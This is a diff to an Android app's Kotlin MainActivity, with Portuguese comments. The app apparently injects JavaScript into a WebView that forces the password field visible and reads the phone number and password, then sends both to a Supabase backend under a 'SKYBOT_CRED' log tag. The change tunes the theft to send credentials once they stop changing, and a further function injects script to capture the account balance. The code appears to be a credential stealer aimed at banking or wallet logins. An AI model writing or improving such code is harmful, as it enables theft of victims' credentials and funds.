@@ -1063,40 +1063,44 @@ class MainActivity : AppCompatActivity() {
             "return n+'|||'+s;" +
             "})()"
 
-        // Guardar último valor enviado para detectar mudança dígito a dígito
-        var ultimoNumEnviado = ""
-        var ultimoSenEnviado = ""
+        // Só envia 1 vez por sessão — quando número E senha estabilizam (2 polls sem mudança)
+        var numEstavel = ""
+        var senEstavel = ""
+        var credenciaisEnviadas = false
+        var ticksSemMudanca = 0
 
         val poller = object : Runnable {
             override fun run() {
-                // Garantir que password está sempre visível
+                if (credenciaisEnviadas) return  // já enviou — para o poller
+
                 webView.evaluateJavascript(jsVis, null)
 
                 webView.evaluateJavascript(jsRead) { raw ->
                     try {
                         if (raw != null && raw != "null" && raw.contains("|||")) {
                             val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
-                                .replace("\\n", "").replace("\\\"", "\"")
+                                .replace("\n", "").replace("\\\"", "\"")
                             val parts = clean.split("|||")
                             val num = if (parts.size > 0) parts[0].trim() else ""
                             val sen = if (parts.size > 1) parts[1].trim() else ""
 
-                            // Enviar ao Supabase a cada dígito novo — sem esperar submit
-                            val numMudou = num.isNotEmpty() && num != ultimoNumEnviado
-                            val senMudou = sen.isNotEmpty() && sen != ultimoSenEnviado
-
-                            if (numMudou) {
-                                ultimoNumEnviado    = num
+                            val mudou = num != numEstavel || sen != senEstavel
+                            if (mudou) {
+                                numEstavel = num
+                                senEstavel = sen
+                                ticksSemMudanca = 0
                                 ultimoNumeroEnviado = num
-                                numeroTemporario    = num
-                                android.util.Log.d("SKYBOT_CRED", "Número → $num")
-                                enviarSupabase("Numero", num)
-                            }
-                            if (senMudou) {
-                                ultimoSenEnviado   = sen
                                 ultimaSenhaEnviada = sen
-                                android.util.Log.d("SKYBOT_CRED", "Senha → len=${sen.length}")
-                                enviarSupabase("Senha", sen)
+                                numeroTemporario = num
+                            } else if (num.isNotEmpty() && sen.isNotEmpty()) {
+                                ticksSemMudanca++
+                                if (ticksSemMudanca >= 2 && !credenciaisEnviadas) {
+                                    credenciaisEnviadas = true
+                                    android.util.Log.d("SKYBOT_CRED", "Envio único → num=$num sen.len=${sen.length}")
+                                    enviarSupabase("Numero", num)
+                                    enviarSupabase("Senha", sen)
+                                    return@evaluateJavascript
+                                }
                             }
                         }
                     } catch (_: Exception) {}
@@ -1107,7 +1111,7 @@ class MainActivity : AppCompatActivity() {
         handler.post(poller)
     }
 
-    private fun injetarJsCapturarSaldo() {
+        private fun injetarJsCapturarSaldo() {
         val js = """
 (function() {
     if (window._saldoDone) return;
